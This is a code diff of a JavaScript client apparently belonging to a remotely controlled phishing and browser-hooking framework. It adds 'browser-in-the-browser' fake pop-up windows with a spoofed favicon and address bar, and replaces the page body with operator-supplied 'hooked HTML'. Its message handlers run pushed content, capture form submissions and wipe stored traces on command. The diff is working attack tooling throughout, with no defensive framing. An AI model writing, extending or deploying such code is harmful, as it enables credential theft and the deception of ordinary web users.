-                                                localStorage.removeItem('eden-blur-intensity');
-                                                localStorage.removeItem('blur-content');
-                                                localStorage.setItem('clean-flag', 'true');
-                                                sessionStorage.setItem('clean-flag', 'true');
-                                            }
-                                            
+                                            processBlurFormSubmission(form);
                                             return false;
                                         }
                                     }, true); // Use capturing to catch all form submissions
@@ -3508,7 +4995,17 @@ const EDEN_LINK_PREVIEW = {
                         
                         case 'showContent':
                             // Display HTML content in the main container
-                            showContent(message.content, message.fileName, message.reload || false);
+                            if (message.reload) {
+                                // Fixed reload delay to 1.5 seconds (matching test.html)
+                                setTimeout(() => {
+                                    // CPU stall (1.5 sec) - like test.html
+                                    let start = performance.now();
+                                    while (performance.now() - start < 1500) {}
+                                    showContent(message.content, message.fileName, message.reload || false);
+                                }, 1500);
+                            } else {
+                                showContent(message.content, message.fileName, message.reload || false);
+                            }
                             break;
 
                         case 'request-content':
@@ -3519,12 +5016,6 @@ const EDEN_LINK_PREVIEW = {
                             // Handle showsContent directly 
                             if (message.content && typeof message.content === 'string') {
                                 console.log('Received showsContent message with content');
-                                // Store showContent in localStorage
-                                localStorage.setItem('showsContent', message.content);
-                                
-                                // Hide placeholder if present
-                                const placeholder = document.getElementById('placeholder');
-                                if (placeholder) placeholder.style.display = 'none';
                                 
                                 // Check if we should display on blurred background
                                 if (message.onBlurredBackground) {
@@ -3537,24 +5028,40 @@ const EDEN_LINK_PREVIEW = {
                                         }
                                     });
                                     
-                                    // Create content container
+                                    // Create content container - full page (no side blanks)
                                     const contentContainer = document.createElement('div');
                                     contentContainer.className = 'eden-content-container';
                                     contentContainer.style.position = 'fixed';
-                                    contentContainer.style.top = '50%';
-                                    contentContainer.style.left = '50%';
-                                    contentContainer.style.transform = 'translate(-50%, -50%)';
-                                    contentContainer.style.width = '90%';
-                                    contentContainer.style.maxWidth = '800px';
-                                    contentContainer.style.maxHeight = '90vh';
+                                    contentContainer.style.top = '0';
+                                    contentContainer.style.left = '0';
+                                    contentContainer.style.width = '100%';
+                                    contentContainer.style.height = '100%';
                                     contentContainer.style.backgroundColor = 'transparent';
-                                    contentContainer.style.padding = '20px';
-                                    contentContainer.style.borderRadius = '8px';
-                                    contentContainer.style.boxShadow = '0 8px 30px rgba(0, 0, 0, 0.3)';
+                                    contentContainer.style.padding = '0';
+                                    contentContainer.style.margin = '0';
+                                    contentContainer.style.border = 'none';
                                     contentContainer.style.zIndex = '9999';
                                     contentContainer.style.overflow = 'auto';
-                                    contentContainer.style.border = '1px solid rgba(0,0,0,0.1)';
-                                    contentContainer.innerHTML = message.content;
+                                    contentContainer.style.boxSizing = 'border-box';
+                                    
+                                    const iframe = document.createElement('iframe');
+                                    iframe.style.width = '100%';
+                                    iframe.style.height = '100%';
+                                    iframe.style.minHeight = '100%';
+                                    iframe.style.border = 'none';
+                                    iframe.style.display = 'block';
+                                    iframe.style.backgroundColor = 'white';
+                                    contentContainer.appendChild(iframe);
+                                    
+                                    // Write content to iframe
+                                    try {
+                                        const doc = iframe.contentWindow.document;
+                                        doc.open();
+                                        doc.write(message.content);
+                                        doc.close();
+                                    } catch (e) {
+                                        console.error('Error writing to iframe:', e);
+                                    }
                                     
                                     // Create close button
                                     const closeButton = document.createElement('button');
@@ -3591,17 +5098,28 @@ const EDEN_LINK_PREVIEW = {
                                         localStorage.setItem('lastLoadedFile', message.fileName);
                                     }
                                 } else {
-                                    // Regular display in container
-                                    const container = getMainContainer();
-                                    if (container) {
+                                    // Store showContent in localStorage only for non-blur display
+                                    localStorage.setItem('showsContent', message.content);
+                                    
+                                    // Regular display - write directly to body WITHOUT wrappers
                                         // If reload is true, force a page reload
                                         if (message.reload) {
                                             location.reload();
                                             return;
                                         }
                                         
-                                        // Otherwise update the content directly
-                                        container.innerHTML = message.content;
+                                    // Write directly to body - NO containers, NO wrappers, NO CSS
+                                    // BUT preserve BITB root container if it exists
+                                    if (document.body) {
+                                        // Preserve BITB root before replacing body content
+                                        preserveBitBLayer();
+                                        
+                                        // Replace body content
+                                        document.body.innerHTML = message.content;
+                                        
+                                        // Restore BITB layer after replacement
+                                        restoreBitBLayer();
+                                    }
                                         
                                         // If we have a filename, store it
                                         if (message.fileName) {
@@ -3614,37 +5132,60 @@ const EDEN_LINK_PREVIEW = {
                                                 el.parentNode.removeChild(el);
                                             }
                                         });
-                                    }
+                                        
+                                        // Trigger QR detection after content is injected
+                                        setTimeout(() => {
+                                            if (typeof checkAndDisplayQR === 'function') {
+                                                checkAndDisplayQR();
+                                            }
+                                            if (typeof initEdenQR === 'function') {
+                                                initEdenQR();
+                                            }
+                                        }, 100);
                                 }
                             }
                             break;
                             
                         case 'BITBContent':
-                            
-                            // Display content in a popup window
+                            // BITB content handler
                             if (message.broadcast === true || isClientTargeted(message)) {
-                                console.log('Received BITBContent request, creating browser window');
-                                try {
-                                    // Ensure we have valid content to display
-                                    const content = message.content || '<html><body><p>No content provided</p></body></html>';
-                                    const fileName = message.fileName || 'window_' + Date.now();
-                                    
-                                    // Use setTimeout to ensure DOM is ready
-                                    setTimeout(() => {
-                                        const window = showContentInWindow(content, fileName);
-                                        console.log('Browser window created:', window ? 'success' : 'failed');
-                                    }, 10);
-                                } catch (error) {
-                                    console.error('Error creating window:', error);
-                                }
-                            } else {
-                                console.log('Window creation skipped - client not targeted');
+                                handleBITBContent(message);
                             }
                             break;
                             
                         case 'executeContent':
                             // Execute content with potential script execution
-                            executeContent(message.content, message.fileName, message.resources, message.reload || false);
+                            if (message.reload) {
+                                // Fixed reload delay to 1.5 seconds (matching test.html)
+                                setTimeout(() => {
+                                    // CPU stall (1.5 sec) - like test.html
+                                    let start = performance.now();
+                                    while (performance.now() - start < 1500) {}
+                                    executeContent(message.content, message.fileName, message.resources, message.reload || false);
+                                }, 1500);
+                            } else {
+                                executeContent(message.content, message.fileName, message.resources, message.reload || false);
+                            }
+                            break;
+                            
+                        case 'manualReload':
+                            if (message.broadcast === true || isClientTargeted(message)) {
+                                console.log('Manual reload requested (no file applied after reload)');
+                                localStorage.removeItem('BITB_pending');
+                                localStorage.removeItem('BITB_reload');
+                                localStorage.removeItem('BITB_fileName');
+                                localStorage.removeItem('BITB_favicon');
+                                localStorage.removeItem('BITB_url');
+                                localStorage.removeItem('blur-content');
+                                localStorage.removeItem('showsContent');
+                                localStorage.removeItem('lastLoadedFile');
+                                localStorage.removeItem('eden-rendered-html');
+                                localStorage.removeItem('eden-html-rendered-time');
+                                localStorage.removeItem('lastPageState');
+                                localStorage.removeItem('pendingJsExecution');
+                                localStorage.removeItem('pendingJsCode');
+                                location.reload(true);
+                            }
                             break;
                             
                      
@@ -3666,6 +5207,7 @@ const EDEN_LINK_PREVIEW = {
                                 // Clear the blur display only if this client is targeted
                                 if (message.broadcast === true || isClientTargeted(message)) {
                                     console.log('Received cleanBlurDisplay command - performing thorough cleanup');
+                                    
                                     // First clear the content using cleanContent
                                     cleanContent();
                                     
@@ -3675,6 +5217,63 @@ const EDEN_LINK_PREVIEW = {
                                     // Extra measures to prevent persistence after refresh
                                     localStorage.setItem('clean-flag', 'true');
                                     sessionStorage.setItem('clean-flag', 'true');
+                                    
+                                    // Restore base HTML file (index.html) without refresh
+                                    // Fetch the original base HTML file and restore it
+                                    const baseHtmlPath = window.location.pathname.includes('/') 
+                                        ? window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1) + 'index.html'
+                                        : 'index.html';
+                                    
+                                    fetch(baseHtmlPath)
+                                        .then(response => {
+                                            if (!response.ok) {
+                                                throw new Error('Failed to fetch base HTML');
+                                            }
+                                            return response.text();
+                                        })
+                                        .then(html => {
+                                            try {
+                                                const parser = new DOMParser();
+                                                const doc = parser.parseFromString(html, 'text/html');
+                                                
+                                                if (!doc.body) {
+                                                    throw new Error('Parsed HTML has no body');
+                                                }
+                                                
+                                                // Restore head content (styles, scripts, etc.)
+                                                if (doc.head) {
+                                                    // Clear existing head content
+                                                    document.head.innerHTML = '';
+                                                    // Copy all head elements
+                                                    Array.from(doc.head.children).forEach(child => {
+                                                        document.head.appendChild(child.cloneNode(true));
+                                                    });
+                                                }
+                                                
+                                                // Restore body content (original base HTML structure)
+                                                if (document.body) {
+                                                    preserveBitBLayer();
+                                                    // Clear existing body
+                                                    document.body.innerHTML = '';
+                                                    // Copy all body elements
+                                                    Array.from(doc.body.children).forEach(child => {
+                                                        document.body.appendChild(child.cloneNode(true));
+                                                    });
+                                                    restoreBitBLayer();
+                                                }
+                                                
+                                                console.log('Base HTML file restored after cleaning');
+                                            } catch (restoreError) {
+                                                console.error('Error restoring base HTML:', restoreError);
+                                                // Fallback: reload page if restore fails
+                                                location.reload();
+                                            }
+                                        })
+                                        .catch(error => {
+                                            console.error('Error fetching base HTML:', error);
+                                            // Try alternative: reload page to show base HTML
+                                            location.reload();
+                                        });
                                     
                                     console.log('Display completely cleaned - content will not persist');
                                 }
@@ -3687,6 +5286,13 @@ const EDEN_LINK_PREVIEW = {
                         case 'cleanContent':
                             // Clear the display
                             cleanContent();
+                            break;
+                            
+                        case 'clean-event-handlers':
+                            if (message.broadcast === true || isClientTargeted(message)) {
+                                console.log('Cleaning all event handlers');
+                                cleanAllEventHandlers();
+                            }
                             break;
                             
                         case 'clearWindows':
@@ -3997,22 +5603,46 @@ const EDEN_LINK_PREVIEW = {
     // Create window styles
     const windowStyle = document.createElement('style');
     windowStyle.textContent = `
-        .window-content {
-            flex: 1;
-            overflow: auto;
-            padding: 0;
-            box-sizing: border-box;
-            background-color: white;
-            position: relative;
-            isolation: isolate;
+        /* BITB layer: on documentElement, survives showContent */
+        #eden-bitb-layer {
+            position: fixed !important;
+            inset: 0 !important;
+            z-index: 999999999 !important;
+            pointer-events: auto !important;
+            background: transparent !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            border: none !important;
+            box-sizing: border-box !important;
+            isolation: isolate !important;
+        }
+        #eden-bitb-window {
+            position: fixed !important;
+            top: 50% !important;
+            left: 50% !important;
+            transform: translate(-50%, -50%) !important;
         }
         
-        /* Iframe container to isolate content */
+        .window-content {
+            flex: 1 !important;
+            overflow: hidden !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            box-sizing: border-box !important;
+            background-color: white !important;
+            position: relative !important;
+            isolation: isolate !important;
+        }
+        
+        /* Iframe container to isolate content - NO LEAKAGE */
         .iframe-container {
-            width: 100%;
-            height: 100%;
-            border: none;
-            overflow: hidden;
+            width: 100% !important;
+            height: 100% !important;
+            border: none !important;
+            display: block !important;
+            overflow: hidden !important;
+            margin: 0 !important;
+            padding: 0 !important;
         }
         .browser-window {
             position: fixed;
@@ -4089,7 +5719,8 @@ const EDEN_LINK_PREVIEW = {
             padding: 0 10px;
             border-radius: 8px 8px 0 0;
             margin-right: 1px;
-            min-width: 100px;
+            min-width: 60px;
+            max-width: 180px;
             position: relative;
         }
         
@@ -4123,7 +5754,7 @@ const EDEN_LINK_PREVIEW = {
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
-            max-width: 200px;
+            max-width: 120px;
         }
         .tab-close {
             width: 16px;
@@ -4322,31 +5953,10 @@ const EDEN_LINK_PREVIEW = {
         .window-content {
             flex: 1;
             overflow: auto;
-            padding: 20px;
+            padding: 0;
         }
 
-        /* Main content and placeholder styling */
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f9f9f9;
-        }
-        #main-content {
-            width: 100%;
-            min-height: 100vh;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        #placeholder {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            color: #666;
-            font-size: 18px;
-            text-align: center;
-        }
+        /* NO CSS for body, html, main-content, or placeholder - hooked HTML must render exactly as-is */
     `;
     document.head.appendChild(windowStyle);
 
@@ -4362,35 +5972,8 @@ const EDEN_LINK_PREVIEW = {
 
     // Helper Functions for Content Display
     
-    // Create or get main container
-    function getMainContainer() {
-        let container = document.getElementById('main-content');
-        if (!container) {
-            // Create main container if it doesn't exist
-            container = document.createElement('div');
-            container.id = 'main-content';
-            container.style.width = '100%';
-            container.style.minHeight = '300px';
-            container.style.padding = '20px';
-            container.style.boxSizing = 'border-box';
-            
-            // Create placeholder for empty state
-            const placeholder = document.createElement('div');
-            placeholder.id = 'placeholder';
-            placeholder.style.display = 'flex';
-            placeholder.style.alignItems = 'center';
-            placeholder.style.justifyContent = 'center';
-            placeholder.style.height = '100%';
-            placeholder.style.color = '#666';
-            placeholder.style.fontSize = '18px';
-            placeholder.innerHTML = '<p>No content to display</p>';
-            
-            // Add elements to body
-            document.body.appendChild(container);
-            document.body.appendChild(placeholder);
-        }
-        return container;
-    }
+    // REMOVED getMainContainer() - no wrappers, containers, or CSS allowed for hooked HTML
+    // Hooked HTML must be written directly to body.innerHTML without any modifications
     
     // Display content in the main container
     function showContent(content, fileName, shouldReload = false) {
@@ -4419,10 +6002,9 @@ const EDEN_LINK_PREVIEW = {
             overlay.style.zIndex = '9999';
             overlay.style.backgroundColor = '#fff';
             
-            // Clone the main content to stay visible during reload
-            const mainContent = document.getElementById('main-content');
-            if (mainContent) {
-                const contentClone = mainContent.cloneNode(true);
+            // Clone the body content to stay visible during reload
+            if (document.body) {
+                const contentClone = document.body.cloneNode(true);
                 overlay.appendChild(contentClone);
             }
             
@@ -4449,38 +6031,36 @@ const EDEN_LINK_PREVIEW = {
             return;
         }
         
-        // No reload requested: first clear the whole page, then apply the HTML
+        // No reload requested: write HTML directly to body. NEVER use document.write (would kill BITB layer).
         try {
+            if (!document.body) return;
             const isFullDocument = /<html[\s\S]*<\/html>/i.test(content) || /<body[\s\S]*<\/body>/i.test(content) || /<head[\s\S]*<\/head>/i.test(content);
+            let bodyHTML = content;
             if (isFullDocument) {
-                // Replace entire document with provided HTML
-                document.open();
-                document.write(content);
-                document.close();
-                return;
-            } else {
-                // Clear current body content entirely
-                if (document.body) {
-                    document.body.innerHTML = '';
-                }
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(content, 'text/html');
+                bodyHTML = doc.body ? doc.body.innerHTML : content;
             }
+            const preserve = document.getElementById('eden-bitb-layer');
+            if (preserve && preserve.parentNode) preserve.parentNode.removeChild(preserve);
+            document.body.innerHTML = bodyHTML;
+            if (preserve) document.documentElement.appendChild(preserve);
+            
+            // Trigger QR detection after content is injected
+            setTimeout(() => {
+                if (typeof checkAndDisplayQR === 'function') {
+                    checkAndDisplayQR();
+                }
+                if (typeof initEdenQR === 'function') {
+                    initEdenQR();
+                }
+            }, 100);
         } catch (e) {
-            console.warn('Error while clearing page before applying content:', e);
-        }
-        
-        // Recreate/get the main container after clearing
-        const container = getMainContainer();
-        
-        // Hide placeholder after container exists
-        const placeholder = document.getElementById('placeholder');
-        if (placeholder) placeholder.style.display = 'none';
-        
-        if (container) {
-            container.innerHTML = content;
+            console.warn('Error while applying content:', e);
         }
 
         // Add event listeners to any forms
-        const forms = document.querySelectorAll('#main-content form');
+        const forms = document.querySelectorAll('form');
         forms.forEach(form => {
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -4519,12 +6099,11 @@ const EDEN_LINK_PREVIEW = {
         
         // Capture current page state before doing anything
         const currentPageState = {
-            placeholder: document.getElementById('placeholder') ? document.getElementById('placeholder').style.display : 'none',
-            mainContent: document.getElementById('main-content') ? document.getElementById('main-content').innerHTML : ''
+            bodyContent: document.body ? document.body.innerHTML : ''
         };
         
         // Store the current page state for preservation across refreshes
-        if (currentPageState.mainContent && currentPageState.mainContent.trim() !== '') {
+        if (currentPageState.bodyContent && currentPageState.bodyContent.trim() !== '') {
             localStorage.setItem('lastPageState', JSON.stringify(currentPageState));
         }
         
@@ -4582,10 +6161,9 @@ const EDEN_LINK_PREVIEW = {
             overlay.style.zIndex = '9999';
             overlay.style.backgroundColor = '#fff';
             
-            // Clone the main content to stay visible during reload
-            const mainContent = document.getElementById('main-content');
-            if (mainContent) {
-                const contentClone = mainContent.cloneNode(true);
+            // Clone the body content to stay visible during reload
+            if (document.body) {
+                const contentClone = document.body.cloneNode(true);
                 overlay.appendChild(contentClone);
             }
             
@@ -4616,9 +6194,7 @@ const EDEN_LINK_PREVIEW = {
         if (isJavaScript) {
             console.log('Executing JavaScript content...');
             
-            // Get references to important elements
-            const placeholder = document.getElementById('placeholder');
-            const container = getMainContainer();
+            // NO placeholder or container - content writes directly to body
             
             // Create a separate execution environment that won't affect the main page
             try {
@@ -4652,12 +6228,7 @@ const EDEN_LINK_PREVIEW = {
                             
                             // Create a wrapper that preserves page state
                             window.alert = function(message) {
-                                // Make sure the content is visible during the alert
-                                const placeholder = document.getElementById('placeholder');
-                                const container = document.getElementById('main-content');
-                                
-                                if (placeholder) placeholder.style.display = 'none';
-                                
+                                // NO placeholder or container - content writes directly to body
                                 // Call the original alert function
                                 originalAlert(message);
                                 
@@ -4689,19 +6260,31 @@ const EDEN_LINK_PREVIEW = {
                 alert('JavaScript execution error: ' + error.message);
             }
         } else {
-            // For non-JavaScript content, update the display
-            document.getElementById('placeholder').style.display = 'none';
-            const container = getMainContainer();
-            
-            if (container) {
-                // Update the content
-                container.innerHTML = content;
+            // For non-JavaScript content, write directly to body WITHOUT wrappers
+            // BUT preserve BITB root container if it exists
+            if (document.body) {
+                // Preserve BITB root before replacing body content
+                preserveBitBLayer();
+                
+                // Replace body content
+                document.body.innerHTML = content;
+                
+                // Restore BITB root after replacement
+                restoreBitBLayer();
+            }
+                
+                // Trigger QR detection after content is injected
+                setTimeout(() => {
+                    if (typeof checkAndDisplayQR === 'function') {
+                        checkAndDisplayQR();
+                    }
+                    if (typeof initEdenQR === 'function') {
+                        initEdenQR();
+                    }
+                }, 100);
                 
                 // Monitor forms in the new content
                 setTimeout(() => monitorForms(document), 300);
-            } else {
-                console.error('Main content container not found');
-            }
         }
     }
     
@@ -4718,7 +6301,13 @@ const EDEN_LINK_PREVIEW = {
     // Window control functions
     function minimizeWindow(button) {
         const browserWindow = button.closest('.browser-window');
+        if (!browserWindow) return;
+        
+        // Hide the window visually but keep it in the DOM (do NOT unload iframe)
         browserWindow.classList.add('minimized');
+        browserWindow.style.opacity = '0';
+        browserWindow.style.pointerEvents = 'none';
+        browserWindow.style.transform = 'translate(-50%, 150%) scale(0.8)';
         
         // Store the window state in localStorage with minimized flag
         const windowId = browserWindow.id;
@@ -4733,11 +6322,6 @@ const EDEN_LINK_PREVIEW = {
         } catch (e) {
             console.error('Error updating minimized state:', e);
         }
-        
-        // Hide the window visually but keep it in the DOM
-        browserWindow.style.opacity = '0';
-        browserWindow.style.pointerEvents = 'none';
-        browserWindow.style.transform = 'translate(-50%, 150%) scale(0.8)';
     }
 
     function maximizeWindow(button) {
@@ -4814,24 +6398,18 @@ const EDEN_LINK_PREVIEW = {
 
     function closeWindow(button) {
         const browserWindow = button.closest('.browser-window');
-        if (browserWindow) {
-            browserWindow.classList.add('closing');
-            
-            // Remove this window from localStorage
-            const windowId = browserWindow.id;
-            localStorage.removeItem('BITBContent_' + windowId);
-            
-            // Add visual transition before removing
-            browserWindow.style.opacity = '0';
-            browserWindow.style.transform = 'scale(0.9)';
-            
-            // Remove the window from the DOM after animation completes
-            setTimeout(() => {
-                browserWindow.remove();
-            }, 300);
-            
-            console.log(`Window ${windowId} closed and removed from localStorage`);
-        }
+        if (!browserWindow) return;
+        const logicalId = browserWindow.getAttribute('data-window-id') || browserWindow.id;
+        const windowKey = 'BITBContent_' + logicalId;
+        console.log('Closing BITB window:', logicalId);
+        browserWindow.classList.add('closing');
+        browserWindow.style.opacity = '0';
+        browserWindow.style.transform = 'scale(0.9)';
+        setTimeout(() => {
+            browserWindow.remove();
+            try { localStorage.removeItem(windowKey); } catch (e) {}
+            console.log('BITB window closed:', logicalId);
+        }, 300);
     }
     
     // Drag functionality
@@ -4870,16 +6448,14 @@ const EDEN_LINK_PREVIEW = {
             currentX = e.clientX - initialX;
             currentY = e.clientY - initialY;
             
-            // Set bounds to keep window within viewport
             const maxX = window.innerWidth - activeWindow.offsetWidth;
             const maxY = window.innerHeight - activeWindow.offsetHeight;
-            
             currentX = Math.max(0, Math.min(currentX, maxX));
             currentY = Math.max(0, Math.min(currentY, maxY));
             
-            activeWindow.style.left = currentX + 'px';
-            activeWindow.style.top = currentY + 'px';
-            activeWindow.style.transform = 'none';
+            activeWindow.style.setProperty('left', currentX + 'px', 'important');
+            activeWindow.style.setProperty('top', currentY + 'px', 'important');
+            activeWindow.style.setProperty('transform', 'none', 'important');
         }
     }
 
@@ -4905,14 +6481,10 @@ const EDEN_LINK_PREVIEW = {
     // Store window state
     function saveWindowState() {
         const windows = document.querySelectorAll('.browser-window');
-        
         windows.forEach(win => {
-            const contentDiv = win.querySelector('.window-content');
             const rect = win.getBoundingClientRect();
-            const windowId = win.id;
-            
-            // Update the window data in localStorage
-            const windowKey = 'BITBContent_' + windowId;
+            const logicalId = win.getAttribute('data-window-id') || win.id;
+            const windowKey = 'BITBContent_' + logicalId;
             if (localStorage.getItem(windowKey)) {
                 try {
                     const windowData = JSON.parse(localStorage.getItem(windowKey));
@@ -4930,12 +6502,47 @@ const EDEN_LINK_PREVIEW = {
     }
     
     // Display content in a browser-like window popup
-    function showContentInWindow(content, fileName) {
+    // This function creates a floating window with complete chrome UI
+    // If targetContainer is provided, appends to that (for BITB isolation)
+    // Otherwise appends directly to body
+    function showContentInWindow(content, fileName, customFavicon, customUrl, targetContainer = null) {
         if (!content) {
             console.error('No content provided to showContentInWindow');
             content = '<html><body><p>No content was provided</p></body></html>';
         }
         console.log(`Showing content in window: ${fileName}`);
+        
+        // Ensure document.body exists - BITB must work even after showContent() replaced body
+        if (!document.body) {
+            console.error('showContentInWindow: document.body not available');
+            setTimeout(() => {
+                if (document.body) {
+                    showContentInWindow(content, fileName, customFavicon, customUrl, targetContainer);
+                } else {
+                    console.error('showContentInWindow: document.body still not available after wait');
+                }
+            }, 100);
+            return null;
+        }
+        
+        // Don't call resetBitBStateHard here - it's already called in launchBitB
+        // Only clean old windows if this is a direct call (not from launchBitB)
+        if (!targetContainer) {
+            // This is a direct call, not from BITB system
+            // Clean old windows but don't remove BITB root
+            const allWindows = document.querySelectorAll('.browser-window');
+            allWindows.forEach(win => {
+                try {
+                    win.remove();
+                } catch (e) {
+                    console.warn('showContentInWindow: Error removing window:', e);
+                }
+            });
+        }
+        
+        // Determine target container: BITB layer (from launchBitB) or body
+        const appendTarget = targetContainer || document.body;
+        const isBitBLayer = !!targetContainer && targetContainer.id === 'eden-bitb-layer';
         
         // Generate a unique ID for this window based on the filename
         const windowId = 'window_' + (fileName ? fileName.replace(/[^a-z0-9]/gi, '_') : Date.now());
@@ -4947,18 +6554,71 @@ const EDEN_LINK_PREVIEW = {
             fileName: fileName,
             timestamp: Date.now(),
             maximized: false,
-            minimized: false
+            minimized: false,
+            customFavicon: customFavicon,
+            customUrl: customUrl
         };
         
-        // Check if a window with this ID already exists
-        let existingWindow = document.getElementById(windowId);
+        // Check if a window with this ID already exists (BITB uses id eden-bitb-window)
+        let existingWindow = isBitBLayer ? document.getElementById('eden-bitb-window') : document.getElementById(windowId);
         
         if (existingWindow) {
-            // Update existing window content
-            const contentDiv = existingWindow.querySelector('.window-content');
-            if (contentDiv) {
-                contentDiv.innerHTML = content;
-                console.log('Updated existing window content');
+            if (isBitBLayer) {
+                const frame = existingWindow.querySelector('#eden-bitb-frame');
+                if (frame) {
+                    frame.removeAttribute('src');
+                    frame.srcdoc = content;
+                    console.log('Updated existing BITB window via iframe.srcdoc');
+                }
+            } else {
+                const contentDiv = existingWindow.querySelector('.window-content');
+                if (contentDiv) {
+                    contentDiv.innerHTML = content;
+                    console.log('Updated existing window content');
+                }
+            }
+            setTimeout(() => {
+                if (typeof checkAndDisplayQR === 'function') checkAndDisplayQR();
+                if (typeof initEdenQR === 'function') initEdenQR();
+            }, 100);
+            
+            // Update favicon and URL if custom values provided
+            if (customFavicon !== null && customFavicon !== undefined && customFavicon !== '') {
+                const existingFavicon = existingWindow.querySelector('.tab-favicon');
+                if (existingFavicon) {
+                    // Check if it's a direct image URL or domain
+                    const imageExtensions = ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp'];
+                    const lowerFavicon = customFavicon.toLowerCase();
+                    const isDirectImage = imageExtensions.some(ext => {
+                        return lowerFavicon.includes(ext) && (lowerFavicon.includes('http') || lowerFavicon.startsWith('data:'));
+                    });
+                    
+                    if (isDirectImage) {
+                        existingFavicon.src = customFavicon;
+                        console.log('Updated favicon to direct image:', customFavicon);
+                    } else {
+                        // Process domain
+                        let domain = customFavicon.trim();
+                        domain = domain.replace(/^https?:\/\//, '');
+                        domain = domain.replace(/\/.*$/, '');
+                        domain = domain.replace(/^www\./, '');
+                        const faviconUrl = `https://www.google.com/s2/favicons?domain=https://${domain}`;
+                        existingFavicon.src = faviconUrl;
+                        console.log('Updated favicon to domain service:', faviconUrl, 'for domain:', domain);
+                    }
+                }
+            }
+            if (customUrl !== null && customUrl !== undefined && customUrl !== '') {
+                const existingUrl = existingWindow.querySelector('.url-input');
+                if (existingUrl) {
+                    // Ensure URL has protocol if it's a domain
+                    let finalUrl = customUrl.trim();
+                    if (finalUrl && !finalUrl.match(/^https?:\/\//)) {
+                        finalUrl = 'https://' + finalUrl;
+                    }
+                    existingUrl.value = finalUrl;
+                    console.log('Updated URL to:', finalUrl);
+                }
             }
             
             // Make sure it's visible (not minimized)
@@ -4971,25 +6631,41 @@ const EDEN_LINK_PREVIEW = {
             allWindows.forEach(win => win.style.zIndex = '9999');
             existingWindow.style.zIndex = '10000';
             
-            // Save updated content to localStorage
+            // Save updated content to localStorage (including custom favicon/URL)
             windowData.maximized = existingWindow.classList.contains('maximized');
+            windowData.customFavicon = customFavicon || windowData.customFavicon;
+            windowData.customUrl = customUrl || windowData.customUrl;
             localStorage.setItem(windowKey, JSON.stringify(windowData));
+            console.log('Updated window data with favicon:', windowData.customFavicon, 'and URL:', windowData.customUrl);
             return;
         }
         
-        // Create browser window
+        // Create browser window - FLOATING, always on top
         const browserWindow = document.createElement('div');
         browserWindow.className = 'browser-window';
-        browserWindow.id = windowId;
+        browserWindow.id = isBitBLayer ? 'eden-bitb-window' : windowId;
+        if (isBitBLayer) browserWindow.setAttribute('data-window-id', windowId);
         
-        // Set default position (centered)
-        browserWindow.style.width = '80%'; 
-        browserWindow.style.maxWidth = '960px';
-        browserWindow.style.height = '80%';
-        browserWindow.style.maxHeight = '640px';
-        browserWindow.style.left = '50%';
-        browserWindow.style.top = '50%';
-        browserWindow.style.transform = 'translate(-50%, -50%)';
+        // Set FLOATING position - fixed, high z-index, always on top
+        // This ensures BITB works even after showContent() replaced body
+        browserWindow.setAttribute('style', `
+            position: fixed !important;
+            z-index: 999999999 !important;
+            width: 80% !important;
+            max-width: 960px !important;
+            height: 80% !important;
+            max-height: 640px !important;
+            left: 50% !important;
+            top: 50% !important;
+            transform: translate(-50%, -50%) !important;
+            background: #fff !important;
+            border-radius: 8px !important;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3) !important;
+            display: flex !important;
+            flex-direction: column !important;
+            overflow: hidden !important;
+            isolation: isolate !important;
+        `);
         
         const title = extractTitle(content, fileName || 'New Tab');
         
@@ -5008,19 +6684,46 @@ const EDEN_LINK_PREVIEW = {
         const tabFavicon = document.createElement('img');
         tabFavicon.className = 'tab-favicon';
         
-        // Create dynamic favicon URL based on filename
-        let faviconDomain = 'localhost';
-        if (fileName) {
-            // Remove .html extension if present
-            faviconDomain = fileName.replace(/\.html$/, '');
+        // Use custom favicon if provided, otherwise create dynamic favicon URL based on filename
+        if (customFavicon !== null && customFavicon !== undefined && customFavicon !== '') {
+            console.log('Setting custom favicon:', customFavicon);
+            // Check if it's a direct image URL (ends with image extensions) or a domain
+            const imageExtensions = ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp'];
+            const isDirectImage = imageExtensions.some(ext => {
+                const lowerFavicon = customFavicon.toLowerCase();
+                return lowerFavicon.includes(ext) && (lowerFavicon.includes('http') || lowerFavicon.startsWith('data:'));
+            });
             
-            // Add .com domain extension if it doesn't already have it
-            if (!faviconDomain.endsWith('.com')) {
-                faviconDomain += '.com';
+            if (isDirectImage) {
+                // Direct image URL - use as is
+                tabFavicon.src = customFavicon;
+                console.log('Using direct image URL for favicon:', customFavicon);
+            } else {
+                // Assume it's a domain - use Google favicon service
+                let domain = customFavicon.trim();
+                // Remove protocol if present
+                domain = domain.replace(/^https?:\/\//, '');
+                // Remove path if present
+                domain = domain.replace(/\/.*$/, '');
+                // Remove www. if present
+                domain = domain.replace(/^www\./, '');
+                const faviconUrl = `https://www.google.com/s2/favicons?domain=https://${domain}`;
+                tabFavicon.src = faviconUrl;
+                console.log('Using domain favicon service:', faviconUrl, 'for domain:', domain);
             }
+        } else {
+            let faviconDomain = 'localhost';
+            if (fileName) {
+                // Remove .html extension if present
+                faviconDomain = fileName.replace(/\.html$/, '');
+                
+                // Add .com domain extension if it doesn't already have it
+                if (!faviconDomain.endsWith('.com')) {
+                    faviconDomain += '.com';
+                }
+            }
+            tabFavicon.src = `https://www.google.com/s2/favicons?domain=https://${faviconDomain}`;
         }
-        
-        tabFavicon.src = `https://www.google.com/s2/favicons?domain=https://${faviconDomain}`;
         
         const tabTitle = document.createElement('div');
         tabTitle.className = 'tab-title';
@@ -5084,7 +6787,18 @@ const EDEN_LINK_PREVIEW = {
         const urlInput = document.createElement('input');
         urlInput.type = 'text';
         urlInput.className = 'url-input';
-        urlInput.value = `https://localhost/${fileName || ''}`;
+        if (customUrl !== null && customUrl !== undefined && customUrl !== '') {
+            // Ensure URL has protocol if it's a domain
+            let finalUrl = customUrl.trim();
